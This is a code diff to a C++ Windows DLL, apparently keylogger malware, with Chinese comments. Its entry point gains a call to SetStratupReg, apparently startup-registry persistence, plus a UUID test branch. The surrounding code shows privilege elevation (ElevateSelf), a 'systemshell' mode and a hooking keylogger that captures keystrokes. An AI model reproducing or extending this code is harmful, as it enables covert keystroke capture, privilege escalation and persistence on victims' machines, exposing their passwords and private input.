@@ -24,6 +24,7 @@ WCHAR module_path[MAX_PATH + 1];
 WCHAR* commandline;
 BOOL stand_alone = false;
 HINSTANCE hModule;   // dll模块实例
+char uuid[] = "3d2f3542-f319-11ea-adc1-0242ac120002";
 
 std::ofstream ofs; // 打开的文件流
 bool file_opened; // 是否打开文件
@@ -84,7 +85,7 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
     UNREFERENCED_PARAMETER(nCmdShow);
     ::hInst = hinst; // 将实例句柄存储在全局变量中
 
-    //elevate_execute((LPCWSTR)NULL, (LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
+    SetStratupReg();
     if (!strcmp(lpszCmdLine, "elevate0"))
     {
         MessageBox(0, L"elevate0", 0, 0);
@@ -113,8 +114,6 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
         ConsoleInit();
         ElevateSelf();
         // Continue to main
-        while (true) Sleep(1000);
-        return;
     }
     else if (!strcmp(lpszCmdLine, "systemshell"))
     {
@@ -239,7 +238,16 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
         while (true) Sleep(1000);
         return;
     }
+    else if (!strcmp(lpszCmdLine, "uuidtest"))
+    {
+        MessageBox(0, L"uuidtest", 0, 0);
+        ConsoleInit();
+        printf("UUID %s .\n", uuid);
+        while (true) Sleep(1000);
+        return;
+    }
 
+    // 开始
     //RawInputKeyLogger.KeyLoggerInit(&ofs);
     ConsoleInit();
     HookKeyLogger.KeyLoggerInit(&std::cout);
